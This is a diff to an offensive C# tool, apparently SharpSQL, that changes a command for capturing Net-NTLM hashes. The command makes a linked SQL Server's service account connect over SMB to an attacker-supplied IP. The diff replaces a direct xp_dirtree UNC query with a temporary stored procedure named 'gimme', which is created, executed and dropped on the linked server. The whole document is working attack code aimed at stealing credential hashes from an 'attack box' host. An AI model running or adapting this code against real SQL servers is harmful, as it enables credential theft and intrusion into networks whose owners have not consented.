@@ -11,17 +11,18 @@ namespace SharpSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Retrieve Net-NTLM Hash for Service Account");
-            Console.WriteLine("\tUsage: SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]");
+            Console.WriteLine("[*]Action: Retrieve Net-NTLM Hash for Service Account Running on Linked SQL Server:");
+            Console.WriteLine("\tUsage: SharpSQL.exe linkedhash /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
             string connectInfo = "";
             string database = "";
             string connectserver = "";
-			string target = "";
+            string target = "";
 			string ip = "";
-            bool sqlauth = false;
+
+			bool sqlauth = false;
 
             if (arguments.ContainsKey("/sqlauth"))
             {
@@ -35,16 +36,16 @@ namespace SharpSQL.Commands
             {
                 connectserver = arguments["/server"];
             }
-			if (arguments.ContainsKey("/target"))
-			{
-				target = arguments["/target"];
-			}
-			if (arguments.ContainsKey("/ip"))
+            if (arguments.ContainsKey("/target"))
             {
-                ip = arguments["/ip"];
+                target = arguments["/target"];
             }
+			if (arguments.ContainsKey("/ip"))
+			{
+				ip = arguments["/ip"];
+			}
 
-            if (String.IsNullOrEmpty(database))
+			if (String.IsNullOrEmpty(database))
             {
                 Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                 return;
@@ -54,18 +55,18 @@ namespace SharpSQL.Commands
                 Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                 return;
             }
-			if (String.IsNullOrEmpty(target))
-			{
-				Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
-				return;
-			}
-			if (String.IsNullOrEmpty(ip))
+            if (String.IsNullOrEmpty(target))
             {
-                Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
+                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                 return;
             }
+			if (String.IsNullOrEmpty(ip))
+			{
+				Console.WriteLine("\r\n[X] You must supply the IP address of your attack box!\r\n");
+				return;
+			}
 
-            if (sqlauth)
+			if (sqlauth)
             {
                 if (arguments.ContainsKey("/user"))
                 {
@@ -105,12 +106,28 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string queryUNC = $"EXEC(EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";) AT [{target}]";
-            SqlCommand command = new SqlCommand(queryUNC, connection);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Close();
+			string createProc = $"EXEC ('CREATE PROCEDURE gimme AS EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";') AT [{target}]";
+			SqlCommand command = new SqlCommand(createProc, connection);
+			SqlDataReader reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("\n[*] Creating Temporary Procedure..");
+			reader.Close();
 
-            connection.Close();
-        }
+			string whoisuser = $"EXEC ('EXEC gimme') AT [{target}]";
+			command = new SqlCommand(whoisuser, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine($"[+] Successfully forced SMB Connection on {target} to {ip}!");
+			reader.Close();
+
+			string dropProc = $"EXEC ('DROP PROCEDURE gimme') AT [{target}]";
+			command = new SqlCommand(dropProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Dropping Temporary Procedure..");
+			reader.Close();
+
+			connection.Close();
+		}
     }
 }
